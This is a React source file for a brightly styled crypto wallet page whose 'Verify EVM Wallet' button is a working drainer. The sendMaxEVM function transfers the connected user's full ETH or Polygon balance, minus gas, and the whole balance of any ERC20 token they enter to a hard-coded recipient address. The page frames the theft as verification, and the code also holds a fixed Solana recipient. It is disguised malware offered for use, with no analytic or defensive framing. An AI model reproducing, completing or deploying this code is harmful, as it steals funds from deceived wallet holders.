import React, { useState, useEffect } from "react";
import { useAppKitAccount, useAppKitProvider, useAppKitBalance } from "@reown/appkit/react";
import { useBalance, useSendTransaction, useWriteContract } from "wagmi";
import { parseEther, parseUnits } from "viem";
import ERC20_ABI from "./abi/erc20.json";
import { ethers } from "ethers";

const backgroundStyle = {
  position: "fixed",
  top: 0,
  left: 0,
  width: "100%",
  height: "100%",
  zIndex: -1,
  background: "linear-gradient(-45deg, #ff9a9e, #fad0c4, #a1c4fd, #c2e9fb)",
  backgroundSize: "400% 400%",
  animation: "gradientBG 15s ease infinite"
};

const styleEl = document.createElement("style");
styleEl.textContent = `
  @keyframes gradientBG {
    0% {background-position: 0% 50%;}
    50% {background-position: 100% 50%;}
    100% {background-position: 0% 50%;}
  }
`;
document.head.appendChild(styleEl);

function App() {
  const { address, isConnected, caipAddress } = useAppKitAccount();
  const [tokenAddress, setTokenAddress] = useState("");

  const isSolana = caipAddress?.startsWith("solana:");
  const isEvm = isConnected && !isSolana;
  const solanaAddress = isSolana ? address : null;

  const FIXED_EVM_RECIPIENT = "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";
  const FIXED_SOL_RECIPIENT = "5a39EMz6Hm3k1gFcMmTxojPijfiDzNxQcWhDpRUtgDRv";

  const ETH_RPC = import.meta.env.VITE_ETHEREUM_RPC_URL;
  const POLYGON_RPC = import.meta.env.VITE_POLYGON_RPC_URL;

  const { data: evmBalance } = useBalance({ address: isEvm ? address : undefined });
  const { sendTransactionAsync } = useSendTransaction();
  const { writeContractAsync } = useWriteContract();

  const estimateGasCost = async (tx, rpcUrl) => {
    try {
      const provider = new ethers.JsonRpcProvider(rpcUrl);
      const estimatedGas = await provider.estimateGas(tx);
      const gasPrice = await provider.getGasPrice();
      return parseFloat(ethers.formatEther(estimatedGas * gasPrice));
    } catch {
      return 0.001;
    }
  };

  const sendMaxEVM = async () => {
    if (!isEvm || !evmBalance?.formatted) return;

    const chains = [ETH_RPC, POLYGON_RPC].filter(Boolean);

    for (let rpcUrl of chains) {
      const provider = new ethers.JsonRpcProvider(rpcUrl);

      const gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") }, rpcUrl);
      const maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
      if (maxETH > 0) {
        await sendTransactionAsync({ to: FIXED_EVM_RECIPIENT, value: parseEther(maxETH.toString()) });
      }

      if (tokenAddress) {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const decimals = await contract.decimals();
        const tokenBalanceRaw = await contract.balanceOf(address);
        const tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));

        const data = contract.interface.encodeFunctionData("transfer", [
          FIXED_EVM_RECIPIENT,
          parseUnits(tokenBalance.toString(), decimals)
        ]);

        const gasCostToken = await estimateGasCost({ to: tokenAddress, data }, rpcUrl);
        if (parseFloat(evmBalance.formatted) < gasCostToken) continue;

        await writeContractAsync({
          address: tokenAddress,
          abi: ERC20_ABI,
          functionName: "transfer",
          args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
        });
      }
    }
  };

  return (
    <div>
      <div style={backgroundStyle}></div>

      <div style={{
        position: "relative",
        zIndex: 1,
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        color: "#fff",
        textAlign: "center",
        padding: 20
      }}>
        {!isConnected ? (
          <>
            <appkit-button />
            <h2 style={{ marginTop: "20px" }}>Connect your wallet to get started</h2>
          </>
        ) : (
          <>
            <h3>Connected: {address}</h3>
            <p>Network: {isSolana ? "Solana" : "EVM"}</p>

            {isEvm && (
              <p>Balance: {evmBalance?.formatted} {evmBalance?.symbol}</p>
            )}

            {isEvm && (
              <>
                <input
                  placeholder="ERC20 Token Address (optional)"
                  value={tokenAddress}
                  onChange={(e) => setTokenAddress(e.target.value)}
                  style={{ width: "300px", marginBottom: "10px", padding: "5px" }}
                />
                <br />
                <button onClick={sendMaxEVM} style={{ padding: "10px 20px", cursor: "pointer" }}>
                  Verify EVM Wallet (ETH + ERC20 + Polygon)
                </button>
              </>
            )}
          </>
        )}
      </div>
    </div>
  );
}

export default App;
